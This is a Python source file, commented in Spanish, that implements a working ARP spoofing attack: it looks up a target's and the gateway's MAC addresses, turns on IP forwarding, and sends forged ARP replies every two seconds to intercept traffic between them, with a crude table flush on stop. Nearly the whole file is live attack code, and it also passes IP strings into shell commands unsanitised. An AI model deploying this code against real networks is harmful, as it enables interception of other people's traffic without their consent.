# core/arp_spoofer.py - Implementación de ARP Spoofing
import subprocess
import threading
import time
import os
import platform
import re

class ARPSpoofer:
    """Clase para realizar ARP Spoofing real"""
    
    def __init__(self, logger):
        self.logger = logger
        self.is_spoofing = False
        self.spoof_thread = None
        self.target_ip = None
        self.gateway_ip = None
        self.os_type = platform.system()
        self.original_arp_table = []
        
    def get_mac_address(self, ip):
        """Obtener dirección MAC de una IP"""
        try:
            if self.os_type == 'Windows':
                # Windows: arp -a
                result = subprocess.run(f'arp -a {ip}', shell=True, capture_output=True, text=True, timeout=5)
                # Buscar MAC en formato XX-XX-XX-XX-XX-XX
                match = re.search(r'([0-9A-Fa-f]{2}-[0-9A-Fa-f]{2}-[0-9A-Fa-f]{2}-[0-9A-Fa-f]{2}-[0-9A-Fa-f]{2}-[0-9A-Fa-f]{2})', result.stdout)
                if match:
                    return match.group(1)
            else:
                # Linux/Mac: arp -n
                result = subprocess.run(f'arp -n {ip}', shell=True, capture_output=True, text=True, timeout=5)
                match = re.search(r'([0-9A-Fa-f]{2}:[0-9A-Fa-f]{2}:[0-9A-Fa-f]{2}:[0-9A-Fa-f]{2}:[0-9A-Fa-f]{2}:[0-9A-Fa-f]{2})', result.stdout)
                if match:
                    return match.group(1)
        except Exception as e:
            self.logger.log(f"⚠️ Error obteniendo MAC: {e}", "YELLOW")
        return None
    
    def get_gateway_ip(self):
        """Obtener IP del gateway"""
        try:
            if self.os_type == 'Windows':
                result = subprocess.run('ipconfig', shell=True, capture_output=True, text=True, timeout=5)
                lines = result.stdout.split('\n')
                for i, line in enumerate(lines):
                    if "Puerta de enlace predeterminada" in line:
                        ips = re.findall(r'\d+\.\d+\.\d+\.\d+', line)
                        if ips and ips[0] != "0.0.0.0":
                            return ips[0]
            else:
                result = subprocess.run('ip route | grep default', shell=True, capture_output=True, text=True, timeout=5)
                match = re.search(r'default via (\d+\.\d+\.\d+\.\d+)', result.stdout)
                if match:
                    return match.group(1)
        except Exception as e:
            self.logger.log(f"⚠️ Error obteniendo gateway: {e}", "YELLOW")
        
        return "192.168.1.1"
    
    def enable_ip_forwarding(self):
        """Habilitar forwarding de IP para que el tráfico siga fluyendo"""
        try:
            if self.os_type == 'Windows':
                # Windows: Habilitar routing
                subprocess.run('reg add HKLM\\SYSTEM\\CurrentControlSet\\Services\\Tcpip\\Parameters /v IPEnableRouter /t REG_DWORD /d 1 /f', shell=True, capture_output=True)
                self.logger.log("✅ IP forwarding habilitado (requiere reinicio para aplicar completamente)", "GREEN")
            else:
                # Linux: echo 1 > /proc/sys/net/ipv4/ip_forward
                subprocess.run('echo 1 > /proc/sys/net/ipv4/ip_forward', shell=True, capture_output=True)
                self.logger.log("✅ IP forwarding habilitado", "GREEN")
            return True
        except Exception as e:
            self.logger.log(f"⚠️ Error habilitando IP forwarding: {e}", "YELLOW")
            return False
    
    def send_arp_packet(self, target_ip, target_mac, spoof_ip):
        """Enviar paquete ARP falsificado"""
        try:
            if self.os_type == 'Windows':
                # Windows: usar arpspoof (requiere instalación) o arp -s
                # Método alternativo: usar Python con scapy si está disponible
                try:
                    from scapy.all import ARP, send
                    packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
                    send(packet, verbose=False, count=1)
                    return True
                except ImportError:
                    # Fallback: usar arp -s para modificar tabla ARP
                    subprocess.run(f'arp -s {spoof_ip} {target_mac}', shell=True, capture_output=True)
                    return True
            else:
                # Linux/Mac: usar arpspoof o send_arp
                try:
                    from scapy.all import ARP, send
                    packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
                    send(packet, verbose=False, count=1)
                    return True
                except ImportError:
                    # Fallback: usar arping
                    subprocess.run(f'arping -S {spoof_ip} -c 1 {target_ip}', shell=True, capture_output=True)
                    return True
        except Exception as e:
            self.logger.log(f"⚠️ Error enviando ARP: {e}", "RED")
            return False
    
    def restore_arp_table(self):
        """Restaurar tabla ARP original"""
        self.logger.log("🔄 Restaurando tabla ARP...", "YELLOW")
        try:
            if self.os_type == 'Windows':
                # Limpiar entradas ARP falsas
                subprocess.run('arp -d', shell=True, capture_output=True)
            else:
                subprocess.run('arp -d', shell=True, capture_output=True)
                subprocess.run('ip neigh flush all', shell=True, capture_output=True)
            self.logger.log("✅ Tabla ARP restaurada", "GREEN")
        except Exception as e:
            self.logger.log(f"⚠️ Error restaurando ARP: {e}", "YELLOW")
    
    def spoof_attack_loop(self):
        """Bucle del ataque ARP spoofing"""
        self.logger.log(f"🔥 Iniciando ataque ARP spoofing real", "RED")
        self.logger.log(f"🎯 Objetivo: {self.target_ip}", "YELLOW")
        self.logger.log(f"🌐 Gateway: {self.gateway_ip}", "YELLOW")
        
        # Habilitar IP forwarding
        self.enable_ip_forwarding()
        
        # Obtener MACs
        target_mac = self.get_mac_address(self.target_ip)
        gateway_mac = self.get_mac_address(self.gateway_ip)
        
        if not target_mac:
            self.logger.log(f"⚠️ No se pudo obtener MAC de {self.target_ip}", "RED")
            return
        if not gateway_mac:
            self.logger.log(f"⚠️ No se pudo obtener MAC del gateway", "RED")
            return
        
        self.logger.log(f"📡 MAC objetivo: {target_mac}", "DIM")
        self.logger.log(f"📡 MAC gateway: {gateway_mac}", "DIM")
        
        packet_count = 0
        
        while self.is_spoofing:
            try:
                self.send_arp_packet(self.target_ip, target_mac, self.gateway_ip)
                
                self.send_arp_packet(self.gateway_ip, gateway_mac, self.target_ip)
                
                packet_count += 2
                
                if packet_count % 20 == 0:
                    self.logger.log(f"📦 {packet_count} paquetes ARP enviados", "CYAN")
                
                time.sleep(2)  # Enviar cada 2 segundos
                
            except Exception as e:
                self.logger.log(f"⚠️ Error en ataque: {e}", "RED")
                time.sleep(1)
    
    def start_attack(self, target_ip):
        """Iniciar ataque ARP spoofing"""
        if self.is_spoofing:
            self.logger.log("⚠️ Ataque ya en curso", "YELLOW")
            return False
        
        self.target_ip = target_ip
        self.gateway_ip = self.get_gateway_ip()
        
        if not self.target_ip or not self.gateway_ip:
            self.logger.log("❌ No se pudo determinar IP objetivo o gateway", "RED")
            return False
        
        self.is_spoofing = True
        self.spoof_thread = threading.Thread(target=self.spoof_attack_loop, daemon=True)
        self.spoof_thread.start()
        
        return True
    
    def stop_attack(self):
        """Detener ataque ARP spoofing"""
        if not self.is_spoofing:
            return
        
        self.logger.log("🛑 Deteniendo ataque ARP spoofing...", "YELLOW")
        self.is_spoofing = False
        
        if self.spoof_thread:
            self.spoof_thread.join(timeout=3)
        
        # Restaurar tabla ARP
        self.restore_arp_table()
        
        self.logger.log("✅ Ataque ARP spoofing detenido", "GREEN")